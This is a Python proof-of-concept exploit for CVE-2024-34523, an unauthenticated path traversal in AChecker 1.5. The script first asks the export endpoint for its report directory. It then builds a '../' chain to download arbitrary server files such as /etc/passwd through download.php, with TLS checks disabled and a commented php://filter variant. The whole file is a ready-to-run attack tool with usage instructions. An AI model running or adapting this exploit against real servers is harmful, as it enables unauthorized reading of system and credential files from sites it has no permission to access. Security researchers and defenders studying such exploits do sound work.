import sys
import requests

def main():
    print("\033[94m    ___    ______ __                 __                  ______              __        _  __ ")
    print("   /   |  / ____// /_   ___   _____ / /__ ___   _____   / ____/_  __ ____   / /____   (_)/ /_")
    print("  / /| | / /    / __ \ / _ \ / ___// //_// _ \ / ___/  / __/  | |/_// __ \ / // __ \ / // __/")
    print(" / ___ |/ /___ / / / //  __// /__ / ,<  /  __// /     / /___ _>  < / /_/ // // /_/ // // /_  ")
    print("/_/  |_|\____//_/ /_/ \___/ \___//_/|_| \___//_/     /_____//_/|_|/ .___//_/ \____//_/ \__/  ")
    print("                                                                 /_/                 \033[0m ")
    print("AChecker, Web Accessibility Checker version 1.5 - Unauthenticated Path Traversal [by Piuppi]\r\n")
    if len(sys.argv) != 3:
        print("Usage: python CVE-2024-34523.py <url>/<context-path> <file>")
        print("Example: python CVE-2024-34523.py http://acheckersite.local/AChecker /etc/passwd")
        return

    url = sys.argv[1]
    file = sys.argv[2]
    start_export = f"{url}/checker/start_export.php"
    start_download= f"{url}/checker/download.php"
    params_export = {
        'file': 'html',
        'problem': 'all'
    }

    try:
        response_start = requests.post(start_export, data=params_export, verify=False)
        response_start.raise_for_status()
        response_text = response_start.text
        directory_path = "/".join(response_text.split("/")[:-1])
        print("\033[92m[+] Retrieve AC_EXPORT_RPT_DIR:\033[0m ", directory_path)
        num_directories = len(directory_path.split("/"))
        up_dirs = "../" * (num_directories - 1)
        # pathfile = "php://filter/convert.base64-encode/resource="+directory_path + "/"+ up_dirs[:-1] + file
        pathfile = directory_path + "/"+ up_dirs[:-1] + file
        print("\033[92m[+] Trigger Directory Traversal: \033[0m",up_dirs[:-1]+file)
        params_download = {'path': pathfile}
        response_download = requests.get(start_download, params_download, stream=True, timeout=10, verify=False)
        response_text_download = response_download.text
        print("\033[92m[+] Obtained File:\033[0m\r\n\r\n\033[93m", response_text_download)
        print("\033[0m")
    except requests.exceptions.RequestException as e:
        print("\033[91m[-] Error:\033[0m ", e)

if __name__ == "__main__":
    main()
